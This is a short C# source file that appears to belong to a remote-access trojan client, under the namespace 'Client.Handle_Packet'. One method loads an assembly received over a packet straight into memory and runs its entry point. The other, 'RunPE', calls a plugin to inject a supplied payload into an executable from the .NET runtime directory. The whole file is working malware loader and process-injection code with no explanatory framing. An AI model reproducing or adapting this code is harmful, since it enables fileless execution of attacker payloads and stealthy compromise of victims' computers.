using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace Client.Handle_Packet
{
    class SendToMemory
    {
        public static void Reflection(object obj)
        {
            object[] Obj = (object[])obj;
            byte[] Buffer = (byte[])Obj[0];
            Assembly Loader = Assembly.Load(Buffer);
            object[] Parameters = null;
            if (Loader.EntryPoint.GetParameters().Length > 0)
            {
                Parameters = new object[] { new string[] { null } };
            }
            Loader.EntryPoint.Invoke(null, Parameters);
        }

        public static void RunPE(object obj)
        {
            try
            {
                object[] Parameters = (object[])obj;
                byte[] File = (byte[])Parameters[0];
                string Injection = Convert.ToString(Parameters[1]);
                byte[] Plugin = (byte[])Parameters[2];
                Assembly Loader = Assembly.Load(Plugin);
                Loader.GetType("Plugin.Program").GetMethod("Run").Invoke(null, new object[] { File, Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), Injection) });
            }
            catch { }
        }
    }
}
